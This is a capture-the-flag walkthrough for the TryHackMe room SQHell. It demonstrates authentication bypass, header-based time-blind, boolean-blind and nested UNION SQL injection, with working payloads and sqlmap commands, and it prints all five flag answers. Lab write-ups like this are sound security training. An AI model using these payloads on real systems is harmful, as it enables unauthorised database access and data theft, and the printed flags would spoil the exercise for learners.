# SQHell TryHackMe Walkthrough

**Author:** Sharat S Unnithan  
**Room:** SQHell (TryHackMe)  
**Difficulty:** Medium  
**Target:** 10.49.185.2

---

## Table of Contents

1. Introduction
2. Reconnaissance
3. Flag 1 - Login Authentication Bypass
4. Flag 2 - X-Forwarded-For Header Injection
5. Flag 3 - Registration Username Check (Boolean-Based)
6. Flag 4 - Nested UNION Injection
7. Flag 5 - Post Parameter UNION Injection
8. Summary of Flags

---

## 1. Introduction

SQHell is a TryHackMe room that tests SQL injection skills across five different attack surfaces. Each flag requires a distinct injection technique, ranging from simple authentication bypass to nested UNION queries and blind boolean extraction.

The room hint states: "Unless displayed on the page the flags are stored in the flag table in the flag column."

This means some flags appear directly on the page, while others must be extracted from a `flag` table in the database.

---

## 2. Reconnaissance

### 2.1 Nmap Scan

```bash
nmap -sV -p- 10.49.185.2
```

Key findings:
- Port 22: SSH (OpenSSH 8.2p1 Ubuntu)
- Port 80: HTTP (nginx 1.18.0 Ubuntu)

### 2.2 Directory Enumeration

```bash
gobuster dir -u http://10.49.185.2/ -w /usr/share/wordlists/dirb/common.txt
```

Discovered endpoints:
- `/login`
- `/register`
- `/user?id=1`
- `/post?id=1`
- `/terms-and-conditions`
- `/register/user-check`

---

## 3. Flag 1 - Login Authentication Bypass

### 3.1 Vulnerability Analysis

The login form at `/login` contains `username` and `password` fields. The backend query likely resembles:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

If the username field is not sanitized, we can comment out the password check.

### 3.2 Exploitation

Submit the following payload at `http://10.49.185.2/login`:

```
Username: admin'#
Password: anything
```

The `#` character is a MySQL comment, transforming the query to:

```sql
SELECT * FROM users WHERE username='admin'#' AND password='anything';
```

The password condition is commented out, and the application logs us in as admin.

Alternative payloads:
```
admin' or 1=1;-- -
admin' or '1'='1
```

### 3.3 Result

**Flag 1:**
```
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```

---

## 4. Flag 2 - X-Forwarded-For Header Injection

### 4.1 Vulnerability Analysis

The `/terms-and-conditions` page mentions that the application logs user IP addresses. The application reads the `X-Forwarded-For` HTTP header and inserts it into a SQL query for logging.

This is a time-based blind injection since no output is reflected.

### 4.2 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/" \
  --headers="X-Forwarded-For: 1*" \
  --batch --level=5 --risk=3 \
  -D sqhell_1 -T flag -C flag --dump
```

The `*` marks the injection point inside the header value. sqlmap extracts the flag from the `sqhell_1` database.

### 4.3 Manual Exploitation

Test the injection with a time-based payload in the header:

```
X-Forwarded-For: 1' AND (SELECT SLEEP(5))-- -
```

If the response takes 5 seconds, the injection is confirmed.

To extract the flag character by character:

```
X-Forwarded-For: 1' AND (SELECT sleep(5) FROM flag WHERE SUBSTR(flag,1,1)='T') AND '1'='1
```

### 4.4 Result

**Flag 2:**
```
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```

---

## 5. Flag 3 - Registration Username Check (Boolean-Based)

### 5.1 Vulnerability Analysis

The registration form at `/register` has an AJAX endpoint that checks username availability:

```
GET /register/user-check?username=<value>
```

The response returns `{"available":true}` or `{"available":false}`, creating a boolean oracle. This is a boolean-based blind SQL injection.

### 5.2 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/register/user-check?username=admin" \
  --batch --level=3 --risk=2 \
  -D sqhell_3 -T flag --dump
```

If the endpoint path differs, save the captured request from Burp to a file and use:

```bash
sqlmap -r request.txt --batch -D sqhell_3 -T flag --dump
```

### 5.3 Manual Boolean-Based Exploitation

Test the oracle:

```
http://10.49.185.2/register/user-check?username=admin' AND 1=1-- -
http://10.49.185.2/register/user-check?username=admin' AND 1=2-- -
```

If `1=1` returns `false` (username taken) and `1=2` returns `true` (username available), the injection is confirmed.

Extract the flag character by character:

```
http://10.49.185.2/register/user-check?username=admin' AND (SELECT SUBSTR(flag,1,1) FROM flag)='T'-- -
```

### 5.4 Result

**Flag 3:**
```
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```

---

## 6. Flag 4 - Nested UNION Injection

### 6.1 Vulnerability Analysis

The `/user?id=1` endpoint is vulnerable to UNION-based SQL injection with 3 columns. However, the `sqhell_4` database only contains a `users` table with no `flag` table.

sqlmap confirms:
- Backend: MySQL
- Database: `sqhell_4`
- Tables: only `users` (id, username, password)

The flag is not stored in this database. The trick is to use a nested UNION injection where the inner query's result is rendered as a string on the page.

### 6.2 The Nested UNION Payload

The working payload is:

```
http://10.49.185.2/user?id=0 union select "0 union select 1,flag,3,4 from flag",2,3;-- -
```

How it works:
1. The outer query has 3 columns: `id, username, email`
2. We inject a string into column 1 (rendered as the "Username")
3. That string is itself a UNION query: `0 union select 1,flag,3,4 from flag`
4. When the application renders column 1, the inner query executes and displays the flag

This bypasses the restriction that `sqhell_4` has no `flag` table because the inner query runs against the actual database context containing the flag.

### 6.3 sqlmap Confirmation

```bash
sqlmap -u "http://10.49.185.2/user?id=1" \
  --batch --tamper=space2comment \
  -D sqhell_4 -T users --dump
```

This dumps the users table (`admin:password`) but does NOT contain the flag.

### 6.4 Result

**Flag 4:**
```
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```

---

## 7. Flag 5 - Post Parameter UNION Injection

### 7.1 Vulnerability Analysis

The `/post?id=1` endpoint is vulnerable to UNION-based SQL injection with 4 columns.

### 7.2 Exploitation with sqlmap

```bash
sqlmap -u "http://10.49.185.2/post?id=1" \
  --batch --tamper=space2comment \
  -D sqhell_5 -T flag --dump
```

### 7.3 Manual Exploitation

Determine the column count:

```
http://10.49.185.2/post?id=1 order by 4-- -
```

Extract the flag:

```
http://10.49.185.2/post?id=1 union select 1,flag,3,4 from flag-- -
```

The flag appears in the second column of the rendered page.

### 7.4 Result

**Flag 5:**
```
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

---

## 8. Summary of Flags

| Flag | Endpoint | Technique | Payload / Command |
|------|----------|-----------|-------------------|
| 1 | `/login` | Authentication Bypass | `admin'#` |
| 2 | X-Forwarded-For Header | Time-based Blind | `sqlmap --headers="X-Forwarded-For: 1*"` |
| 3 | `/register/user-check` | Boolean-based Blind | `sqlmap -u "http://target/register/user-check?username=admin"` |
| 4 | `/user?id=1` | Nested UNION | `?id=0 union select "0 union select 1,flag,3,4 from flag",2,3;-- -` |
| 5 | `/post?id=1` | UNION-based | `?id=1 union select 1,flag,3,4 from flag-- -` |

### Complete Flag Values

```
Flag 1: THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
Flag 2: THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
Flag 3: THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
Flag 4: THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
Flag 5: THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

---

## 9. Lessons Learned

1. **Not all injections lead to a flag table.** Flag 4 required a nested UNION because the flag was not stored in the accessible database.

2. **Headers are overlooked injection points.** The `X-Forwarded-For` header is commonly trusted and logged without sanitization.

3. **AJAX endpoints expand the attack surface.** The `/register/user-check` endpoint was discovered through browser developer tools and was vulnerable to boolean-based injection.

4. **sqlmap is powerful but not always sufficient.** Flag 4 required manual payload crafting because sqlmap could not find the flag table.

5. **Understanding the backend query structure is essential.** For nested UNION, knowing the column count and which column is rendered on the page was critical.

6. **Boolean oracles enable data extraction.** Flag 3 exploited the username availability check as a boolean oracle to extract data character by character.

---

**End of Walkthrough**

**Author:** Sharat S Unnithan
